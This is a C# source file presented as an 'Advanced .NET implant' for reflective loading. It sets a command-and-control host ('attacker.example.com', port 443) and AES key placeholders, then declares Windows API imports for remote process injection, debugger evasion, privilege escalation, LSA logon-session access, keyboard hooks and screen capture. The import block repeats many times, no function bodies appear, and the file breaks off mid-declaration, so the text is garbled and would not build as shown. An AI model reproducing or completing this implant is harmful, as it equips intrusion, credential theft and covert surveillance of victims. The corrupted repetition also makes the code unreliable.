// Stage1.cs - Advanced .NET implant
// Compile: csc /target:library /out:Stage1.dll Stage1.cs
// Reflective load from PowerShell: [System.Reflection.Assembly]::Load($bytes)

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stage1
{
    public class Main
    {
        // --- Configuration ---
        private static string C2_HOST = "attacker.example.com";
        private static int C2_PORT = 443;
        private static bool USE_SSL = true;
        private static byte[] AES_KEY = Convert.FromBase64String("BASE64_32_BYTE_KEY");
        private static byte[] AES_IV = Convert.FromBase64String("BASE64_16_BYTE_IV");
        private static string PIPE_NAME = "C2_" + Guid.NewGuid().ToString().Substring(0,8);

        // --- Win32 API ---
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
